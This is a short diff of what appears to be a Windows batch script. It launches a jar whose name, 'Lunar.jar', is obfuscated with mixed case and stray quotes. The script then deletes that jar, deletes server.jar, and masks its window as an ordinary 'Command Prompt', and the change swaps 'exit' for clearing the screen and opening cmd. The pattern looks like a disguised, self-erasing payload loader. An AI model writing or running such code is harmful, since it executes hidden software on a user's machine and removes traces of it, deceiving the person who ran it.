@@ -7,4 +7,5 @@ jAva -jar Lu"Nar.J"A"r" nog"ui
 del LU"N"a"R.jAR"
 title Command Prompt
 start cmd.exe del server.jar
-exit
+cls
+cmd.exe
